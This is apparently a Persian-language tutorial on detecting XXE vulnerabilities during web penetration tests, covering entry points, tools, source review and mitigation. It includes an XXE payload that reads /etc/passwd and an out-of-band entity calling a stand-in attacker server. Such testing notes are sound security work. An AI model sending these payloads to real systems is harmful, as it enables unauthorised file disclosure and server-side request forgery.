# XXE

آسیب‌پذیری XXE (XML External Entity) زمانی رخ می‌دهد که یک برنامه وب ورودی‌های XML را بدون محدودیت روی موجودیت‌های خارجی (External Entities) پردازش کند. این آسیب‌پذیری می‌تواند منجر به افشای اطلاعات حساس، اجرای کد از راه دور، حملات SSRF و حتی Denial of Service شود.

مراحل و روش‌های کشف XXE
1. شناسایی نقاطی که ورودی XML دریافت می‌کنند
ابتدا باید بخش‌هایی از وب‌سایت یا API که ورودی XML می‌گیرند (مثلاً SOAP، REST با payload XML، آپلود فایل‌های XML و ...) را پیدا کنید.

2. تست دستی با تزریق موجودیت خارجی (External Entity)
یک فایل XML دستکاری شده می‌سازید که در آن یک موجودیت خارجی تعریف شده است. نمونه ساده:

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

این XML را به سرور ارسال کنید (مثلاً در درخواست POST).

اگر محتوای فایل /etc/passwd یا هر فایل محلی دیگری در پاسخ برگشت داده شود، یعنی آسیب‌پذیری XXE وجود دارد.

3. تست با موجودیت خارجی به سمت سرور مهاجم (Out-of-Band)
موجودیت خارجی را به URL سرور خود (که کنترلش را دارید) ارجاع دهید:

```bash
<!ENTITY xxe SYSTEM "http://your-malicious-server.com/evil">
```

سپس با بررسی لاگ‌های سرور خود می‌توانید بفهمید که سرور هدف درخواست به URL شما ارسال کرده است یا خیر. این روش برای شناسایی Blind XXE کاربرد دارد.

4. بررسی پیام‌های خطا و رفتار سرور
گاهی اوقات سرور با خطاهای XML یا پیام‌هایی که حاوی اطلاعات حساس است پاسخ می‌دهد. این پیام‌ها می‌توانند نشانه وجود XXE باشند.

5. استفاده از ابزارهای خودکار
ابزارهایی مثل Burp Suite (با افزونه‌های XXE)، OWASP ZAP و اسکنرهای تخصصی XXE می‌توانند به صورت خودکار ورودی‌های XML را اسکن و آسیب‌پذیری را شناسایی کنند.

6. بررسی کد منبع (در صورت دسترسی)
اگر به کد برنامه دسترسی دارید، بررسی کنید که آیا پارسر XML با تنظیمات امن (غیرفعال کردن DTD، موجودیت‌های خارجی و ...) استفاده شده است یا خیر.

نکات مهم
آسیب‌پذیری XXE زمانی رخ می‌دهد که پارسر XML اجازه بارگذاری DTD و موجودیت‌های خارجی را بدهد.

ساده‌ترین راه جلوگیری، غیرفعال کردن DTD و موجودیت‌های خارجی در پارسر XML است.

XXE می‌تواند منجر به افشای فایل‌های محلی، حملات SSRF و حتی اجرای کد از راه دور شود.

منابع و مطالعه بیشتر
راورو - معرفی و کشف XXE

گروه مهندسین فناوری نوین۵۲ - آسیب‌پذیری XXE

بلاگ گروه لیان - شناسایی و اکسپلویت XXE

آموزش ویدئویی شکار XXE

خلاصه
برای پیدا کردن XXE:

نقاط ورودی XML را شناسایی کنید.

یک فایل XML حاوی موجودیت خارجی (مثلاً خواندن فایل محلی یا ارجاع به URL خارجی) بسازید.

آن را به سرور ارسال کنید و پاسخ یا لاگ‌های سرور را بررسی کنید.

از ابزارهای اتوماتیک برای اسکن کمک بگیرید.

در صورت مشاهده اجرای کد یا افشای اطلاعات، آسیب‌پذیری تایید می‌شود.

این روش‌ها به شما کمک می‌کند تا به صورت دقیق و جامع آسیب‌پذیری XXE را در تست نفوذ وب شناسایی کنید.

======================================================

path: /etc/passwd 
